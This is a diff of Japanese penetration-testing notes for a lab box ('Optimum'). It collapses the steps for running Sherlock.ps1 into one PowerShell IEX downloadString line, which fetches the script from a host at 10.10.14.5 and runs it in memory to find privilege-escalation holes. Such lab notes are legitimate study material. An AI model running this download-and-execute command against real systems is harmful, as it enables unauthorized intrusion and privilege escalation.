@@ -931,13 +931,8 @@ Powershellが使えるならEmpire上から、実行する。
 [Optimum Ippsec movie](https://www.youtube.com/watch?v=kWTnVBIpNsE)
 
 ```
-1. Sherlock.ps1 をvi でファイル編集し、最終行に、
 
-Find-AllVulns　を追加。
-　
-2. 
-
-IEX(New-Object Net.Webclient).downloadString('http://<ip>:8000/Sherlock.ps1')
+IEX(New-Object Net.Webclient).downloadString('http://10.10.14.5:8000/Sherlock.ps1'); Find-AllVulns
 
 ```
 
